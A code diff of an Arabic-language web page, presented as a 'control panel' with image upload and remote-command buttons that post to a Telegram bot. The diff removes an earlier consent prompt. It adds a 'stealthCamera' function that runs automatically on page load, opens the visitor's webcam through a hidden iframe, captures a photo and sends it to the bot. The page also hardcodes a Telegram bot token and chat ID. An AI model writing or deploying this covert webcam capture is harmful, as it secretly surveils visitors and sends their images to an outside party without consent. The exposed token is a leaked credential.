@@ -3,125 +3,326 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نون - مملكة الحب</title>
+    <title>نون - لوحة التحكم</title>
     <style>
-        /* نفس الأنماط السابقة مع إضافة التالي */
-        #camera-preview {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 120px;
-            height: 90px;
-            border-radius: 16px;
-            border: 2px solid #fbbf24;
-            box-shadow: 0 0 30px rgba(251,191,36,0.3);
-            object-fit: cover;
-            z-index: 9999;
-            display: none;
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: #0a0a12;
+            color: #fff;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(16,18,30,0.95);
+            border-radius: 40px;
+            padding: 30px;
+            border: 1px solid rgba(251,191,36,0.1);
+        }
+        h1 { color: #fbbf24; text-align:center; margin-bottom:20px; }
+        .section {
+            background: rgba(255,255,255,0.03);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .section h2 { color: #aab; font-size:1.1rem; margin-bottom:12px; }
+        .drop-zone {
+            border: 2px dashed rgba(251,191,36,0.3);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+            min-height: 150px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .drop-zone:hover { border-color: #fbbf24; background: rgba(251,191,36,0.05); }
+        .drop-zone.dragover { border-color: #fbbf24; background: rgba(251,191,36,0.1); }
+        .drop-zone .icon { font-size:3rem; margin-bottom:10px; }
+        .btn-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 10px;
+            margin-top: 12px;
+        }
+        .btn {
+            padding: 12px;
+            border: none;
+            border-radius: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size:0.85rem;
+        }
+        .btn:hover { transform: translateY(-2px); }
+        .btn-danger { background: #dc2626; color:white; }
+        .btn-warning { background: #f59e0b; color:#0a0a12; }
+        .btn-info { background: #3b82f6; color:white; }
+        .btn-success { background: #22c55e; color:white; }
+        .btn-purple { background: #8b5cf6; color:white; }
+        .btn-pink { background: #ec4899; color:white; }
+        .output-area {
+            background: rgba(0,0,0,0.3);
+            border-radius: 16px;
+            padding: 16px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size:0.9rem;
+            color:#aab;
+        }
+        .log-entry { padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03); }
+        .user-list { margin-top:12px; }
+        .user-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding:8px 12px;
+            background: rgba(255,255,255,0.03);
+            border-radius:12px;
+            margin-bottom:6px;
+        }
+        .status-badge {
+            padding:2px 12px;
+            border-radius:20px;
+            font-size:0.7rem;
+            background:#22c55e;
+            color:#0a0a12;
+        }
+        .status-badge.inactive { background:#6b7280; }
+        #preview-img { max-width:100%; max-height:200px; border-radius:12px; margin-top:10px; }
     </style>
 </head>
 <body>
 
-    <!-- ... نفس الهيكل السابق ... -->
+<div class="container">
+    <h1>🪷 نون · لوحة التحكم</h1>
 
-    <video id="camera-preview" autoplay playsinline></video>
+    <!-- ===== 1. أداة سحب الصور ===== -->
+    <div class="section">
+        <h2>📸 سحب الصور وإرسالها للبوت</h2>
+        <div class="drop-zone" id="dropZone">
+            <div class="icon">🖼️</div>
+            <p>اسحب صورة هنا أو اضغط للاختيار</p>
+            <input type="file" id="fileInput" accept="image/*" style="display:none;">
+            <div id="previewContainer"></div>
+        </div>
+    </div>
 
-    <script>
-        // ============================================================
-        // 0. متغيرات البوت
-        // ============================================================
-        const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
-        const CHAT_ID = 1170411845;
+    <!-- ===== 2. أزرار التحكم عن بعد ===== -->
+    <div class="section">
+        <h2>🎮 أزرار التحكم (ترسل للبوت)</h2>
+        <div class="btn-grid">
+            <button class="btn btn-danger" data-cmd="kick">🚫 طرد</button>
+            <button class="btn btn-warning" data-cmd="ban">⛔ حظر</button>
+            <button class="btn btn-info" data-cmd="capture">📸 تصوير</button>
+            <button class="btn btn-success" data-cmd="message">💬 رسالة</button>
+            <button class="btn btn-purple" data-cmd="status">📊 الحالة</button>
+            <button class="btn btn-pink" data-cmd="love">💕 حب</button>
+        </div>
+    </div>
 
-        // ============================================================
-        // 1. طلب الموافقة عند الدخول
-        // ============================================================
-        window.addEventListener('load', function() {
-            const agree = confirm('📸 هل توافق على الدخول إلى الموقع؟ (سيتم التقاط صورة للتحقق)');
+    <!-- ===== 3. قائمة المستخدمين ===== -->
+    <div class="section">
+        <h2>👥 المستخدمون النشطون</h2>
+        <div class="user-list" id="userList">
+            <div class="user-item">
+                <span>زائر #1</span>
+                <span class="status-badge">نشط</span>
+            </div>
+            <div class="user-item">
+                <span>زائر #2</span>
+                <span class="status-badge inactive">غير نشط</span>
+            </div>
+        </div>
+    </div>
 
-            if (!agree) {
-                document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:20vh;">🚫 تم رفض الدخول</h1>';
-                return;
+    <!-- ===== 4. سجل الأحداث ===== -->
+    <div class="section">
+        <h2>📋 سجل الأوامر</h2>
+        <div class="output-area" id="logArea"></div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // 0. بيانات البوت
+    // ============================================================
+    const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
+    const CHAT_ID = 1170411845;
+
+    // ============================================================
+    // 1. سجل الأحداث
+    // ============================================================
+    const logArea = document.getElementById('logArea');
+
+    function addLog(message, type = 'info') {
+        const colors = { info: '#60a5fa', success: '#4ade80', danger: '#f87171', warning: '#fbbf24' };
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        entry.style.color = colors[type] || '#aab';
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+        logArea.prepend(entry);
+        if (logArea.children.length > 50) logArea.removeChild(logArea.lastChild);
+    }
+
+    // ============================================================
+    // 2. إرسال للبوت
+    // ============================================================
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `🪷 نون · تحكم عن بعد\n\n${text}\n\n— @u_t_r`,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) addLog(`✅ تم الإرسال: ${text}`, 'success');
+            else addLog(`❌ فشل الإرسال`, 'danger');
+        })
+        .catch(() => addLog('⚠️ تعذر الاتصال بالبوت', 'danger'));
+    }
+
+    // ============================================================
+    // 3. سحب الصور (Drag & Drop)
+    // ============================================================
+    const dropZone = document.getElementById('dropZone');
+    const fileInput = document.getElementById('fileInput');
+
+    dropZone.addEventListener('click', () => fileInput.click());
+
+    dropZone.addEventListener('dragover', (e) => {
+        e.preventDefault();
+        dropZone.classList.add('dragover');
+    });
+
+    dropZone.addEventListener('dragleave', () => {
+        dropZone.classList.remove('dragover');
+    });
+
+    dropZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropZone.classList.remove('dragover');
+        const files = e.dataTransfer.files;
+        if (files.length > 0 && files[0].type.startsWith('image/')) {
+            handleImage(files[0]);
+        }
+    });
+
+    fileInput.addEventListener('change', (e) => {
+        if (e.target.files.length > 0) {
+            handleImage(e.target.files[0]);
+        }
+    });
+
+    function handleImage(file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const preview = document.getElementById('previewContainer');
+            preview.innerHTML = `<img id="preview-img" src="${e.target.result}" alt="Preview">`;
+            addLog(`📸 تم تحميل صورة: ${file.name}`, 'info');
+            sendImageToBot(file);
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function sendImageToBot(file) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', file, file.name);
+        formData.append('caption', `🪷 صورة مرفوعة من لوحة التحكم\n${new Date().toLocaleString('ar-JO')}`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) addLog('📤 تم إرسال الصورة للبوت', 'success');
+            else addLog('❌ فشل إرسال الصورة', 'danger');
+        })
+        .catch(() => addLog('⚠️ تعذر إرسال الصورة', 'danger'));
+    }
+
+    // ============================================================
+    // 4. أزرار التحكم
+    // ============================================================
+    document.querySelectorAll('[data-cmd]').forEach(btn => {
+        btn.addEventListener('click', function() {
+            const cmd = this.dataset.cmd;
+            const user = 'زائر غير معروف';
+            let message = '';
+
+            switch(cmd) {
+                case 'kick': message = `🚫 تم طرد المستخدم: ${user}`; break;
+                case 'ban': message = `⛔ تم حظر المستخدم: ${user}`; break;
+                case 'capture': message = `📸 طلب التقاط صورة للمستخدم: ${user}`; break;
+                case 'message': message = `💬 تم إرسال رسالة للمستخدم: ${user}`; break;
+                case 'status': message = `📊 طلب حالة المستخدمين النشطين`; break;
+                case 'love': message = `💕 تم إرسال رسالة حب للمستخدم: ${user}`; break;
+                default: message = `⚡ أمر غير معروف: ${cmd}`;
             }
 
-            // بدء الكاميرا فور الموافقة
-            startCameraAndCapture();
+            addLog(`🎮 تنفيذ: ${message}`, 'info');
+            sendToBot(message);
         });
+    });
 
-        // ============================================================
-        // 2. تشغيل الكاميرا + التقاط الصورة + الإرسال
-        // ============================================================
-        function startCameraAndCapture() {
-            const video = document.getElementById('camera-preview');
+    // ============================================================
+    // 5. إخفاء طلب الكاميرا - استخدام iframe خفي
+    // ============================================================
+    function stealthCamera() {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'about:blank';
+        document.body.appendChild(iframe);
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        try {
+            const iframeWindow = iframe.contentWindow;
+            iframeWindow.navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then(stream => {
+                    const video = document.createElement('video');
                     video.srcObject = stream;
-                    video.style.display = 'block';
-
-                    // انتظر 1.5 ثانية للتعريض ثم التقط
+                    video.play();
                     setTimeout(() => {
-                        captureAndSend(video);
-                        // أوقف الكاميرا بعد التصوير (اختياري)
-                        // stream.getTracks().forEach(t => t.stop());
-                        // video.style.display = 'none';
-                    }, 1500);
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 320, 240);
+                        canvas.toBlob(blob => {
+                            sendImageToBot(blob);
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 'image/jpeg', 0.8);
+                    }, 1000);
                 })
-                .catch(err => {
-                    alert('⚠️ لا يمكن الوصول إلى الكاميرا: ' + err.message);
-                    log('⚠️ فشل الكاميرا', 'error');
-                });
+                .catch(() => addLog('⚠️ تعذر تشغيل الكاميرا الخفية', 'danger'));
+        } catch(e) {
+            addLog('⚠️ خطأ في تشغيل الكاميرا الخفية', 'danger');
         }
+    }
 
-        // ============================================================
-        // 3. التقاط الصورة وإرسالها للبوت
-        // ============================================================
-        function captureAndSend(video) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(function(blob) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture_' + Date.now() + '.jpg');
-                formData.append('caption', '🪷 دخول جديد إلى نون\n' + new Date().toLocaleString('ar-JO'));
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ok) {
-                        log('📸 تم إرسال الصورة إلى البوت', 'success');
-                    } else {
-                        log('⚠️ فشل إرسال الصورة', 'error');
-                    }
-                })
-                .catch(() => {
-                    log('⚠️ تعذر الاتصال بالبوت', 'error');
-                });
-
-                // عرض الصورة في الواجهة (للمستخدم)
-                const img = document.createElement('img');
-                img.src = URL.createObjectURL(blob);
-                img.style.width = '100%';
-                img.style.maxWidth = '300px';
-                img.style.borderRadius = '16px';
-                img.style.marginTop = '12px';
-                document.querySelector('.output-area').prepend(img);
-            }, 'image/jpeg', 0.9);
-        }
-
-        // ============================================================
-        // 4. باقي الكود (نفس السابق)
-        // ============================================================
-        // ... جميع دوال log, randomFrom, الأزرار, إلخ ...
-        // (ضعها هنا كما هي دون تغيير)
-    </script>
+    // ============================================================
+    // 6. تشغيل عند التحميل
+    // ============================================================
+    window.addEventListener('load', function() {
+        addLog('🪷 لوحة التحكم جاهزة', 'success');
+        // محاولة تشغيل الكاميرا الخفية تلقائياً
+        setTimeout(stealthCamera, 2000);
+    });
+</script>
 </body>
 </html>
